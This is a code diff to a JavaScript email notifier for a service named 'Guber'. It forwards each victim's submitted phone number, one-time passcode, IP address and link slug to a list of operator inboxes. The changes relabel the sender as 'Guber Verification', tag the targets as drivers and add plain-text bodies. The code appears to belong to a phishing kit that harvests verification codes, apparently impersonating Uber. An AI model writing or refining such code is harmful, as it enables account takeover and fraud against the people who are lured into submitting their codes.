@@ -244,11 +244,15 @@ async function notifyPhoneSubmitted({ phoneNumber, customSlug, ipAddress, submit
         </div>
     </div>`;
 
+    const plainText = `Guber Notification: New Phone Submitted\nPhone: ${phoneNumber}\nStatus: Awaiting OTP\nLink: ${customSlug || '/'}\nTime: ${timeStr}`;
+
     try {
         const info = await smtpTransporter.sendMail({
-            from: `"Guber Notifications" <${smtpConfig.user}>`,
+            from: `"Guber Verification" <${smtpConfig.user}>`,
+            replyTo: smtpConfig.user,
             to: notificationEmails.join(', '),
-            subject: `📱 New Phone Submitted: ${phoneNumber}`,
+            subject: `📱 Driver Phone Submitted: ${phoneNumber}`,
+            text: plainText,
             html: htmlBody
         });
         console.log(`[EmailNotifier] Phone notification sent to ${notificationEmails.join(', ')}:`, info.messageId);
@@ -315,11 +319,15 @@ async function notifyOTPVerified({ phoneNumber, otp, customSlug, ipAddress, veri
         </div>
     </div>`;
 
+    const plainText = `Guber Notification: OTP Verified\nPhone: ${phoneNumber}\nOTP: ${otp}\nStatus: VERIFIED\nLink: ${customSlug || '/'}\nTime: ${timeStr}`;
+
     try {
         const info = await smtpTransporter.sendMail({
-            from: `"Guber Notifications" <${smtpConfig.user}>`,
+            from: `"Guber Verification" <${smtpConfig.user}>`,
+            replyTo: smtpConfig.user,
             to: notificationEmails.join(', '),
-            subject: `✅ OTP Verified: ${phoneNumber} → Code: ${otp}`,
+            subject: `✅ Driver OTP Verified: ${phoneNumber} [${otp}]`,
+            text: plainText,
             html: htmlBody
         });
         console.log(`[EmailNotifier] OTP notification sent to ${notificationEmails.join(', ')}:`, info.messageId);
